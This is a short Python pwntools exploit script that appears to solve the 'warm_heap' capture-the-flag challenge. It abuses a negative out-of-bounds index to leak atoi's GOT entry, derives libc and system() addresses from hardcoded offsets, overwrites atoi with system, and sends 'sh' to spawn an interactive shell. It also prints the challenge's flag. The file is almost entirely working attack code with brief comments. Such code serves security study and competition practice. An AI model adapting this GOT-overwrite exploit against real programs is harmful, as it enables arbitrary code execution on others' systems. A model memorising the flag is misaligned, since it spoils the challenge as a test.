from pwn import *

atoi_off = 0x36e80
sys_off  = 0x45390

def leak(idx):
	r.sendlineafter('>> ', '4')
	r.sendlineafter('index: ', str(idx))
	return u64(r.recv(6).ljust(8, '\x00'))

def edit(idx, data):
	r.sendlineafter('>> ', '2')
	r.sendlineafter('index: ', str(idx))
	r.sendlineafter('input: ', data)
	return

def pwn():

	# There is negative OOB. By entering -263006
	# we can reach the .rel.plt section which is
	# an array of structs containing addresses to be
	# patched dynamically by the linker (i.e GOT entries)
	idx = -263006
	# Leak atoi's address
	libc   = leak(idx) - atoi_off
	system = libc + sys_off
	log.success("Libc:   0x{:x}".format(libc))
	log.success("system: 0x{:x}".format(system))
	# atoi => system
	edit(idx, p64(system))
	# atoi('sh') => system('sh')
	r.sendline('sh')
	# Flag: inctf{U4f_f0r_l1f3_m8}
	r.interactive()

if __name__ == "__main__":
	r = process('./warm_heap')
	pause()
	pwn()
